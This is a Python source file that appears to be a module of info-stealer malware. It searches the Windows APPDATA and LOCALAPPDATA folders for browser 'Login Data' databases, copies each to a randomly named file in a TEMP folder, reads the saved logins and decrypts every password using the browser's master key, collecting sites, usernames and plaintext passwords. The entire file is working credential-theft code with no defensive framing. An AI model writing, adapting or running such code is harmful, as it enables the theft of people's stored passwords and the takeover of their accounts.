import os
import sqlite3
import shutil
import uuid

from typing import List
from os.path import join, exists
from concurrent.futures import ThreadPoolExecutor
from utils.paths import GetAppDataPaths

from utils.crypto import getmasterkey, decrypt


class Password:
    def __init__(self, site: str, username: str, password: str):
        self.site = site
        self.username = username
        self.password = password


def GetBrowsersPasswords() -> List[Password]:
    allpasswords: List[Password] = []
    with ThreadPoolExecutor() as executor:
        future1 = executor.submit(GetAppDataPaths, 'APPDATA')
        future2 = executor.submit(GetAppDataPaths, 'LOCALAPPDATA')
    paths = future1.result() + future2.result()
    if not exists(join(os.getenv("TEMP"), "browsers")):
        os.mkdir(join(os.getenv("TEMP"), "browsers"))
    for path in paths:
        logindata = GetLoginData(path)
        localstate = join(path, "Local State")
        passwords = QueryPasswords(logindata, localstate)
        allpasswords = allpasswords + passwords

    return allpasswords


def GetLoginData(root) -> str:
    for root, _, files in os.walk(root):
        for file in files:
            if file == "Login Data":
                return join(root, file)


def QueryPasswords(database, keyfile) -> List[Password]:
    if database is None:
        return []
    if not exists(database) or not exists(keyfile):
        return []
    passwords: List[Password] = []
    randomname = str(uuid.uuid4()) + ".db"
    dbfile = join(os.getenv("TEMP"), "browsers", randomname)
    shutil.copy(database, dbfile)
    con = sqlite3.connect(dbfile)
    cur = con.cursor()
    for url, username, encrypted_password in cur.execute("SELECT action_url, username_value, password_value FROM logins"):
        if len(url) == 0 or len(username) == 0 or len(encrypted_password) == 0:
            continue
        with ThreadPoolExecutor() as executor:
            executor.submit(DecryptAndSubmit, url, username, encrypted_password, keyfile, passwords)
    cur.close()
    con.close()

    return passwords


def DecryptAndSubmit(url, username, encrypted_password, keyfile, passwords):
    try:
        key = getmasterkey(keyfile)
        decrypted_password = decrypt(encrypted_password, key)
        passwords.append(Password(url, username, decrypted_password))
    except Exception:
        pass
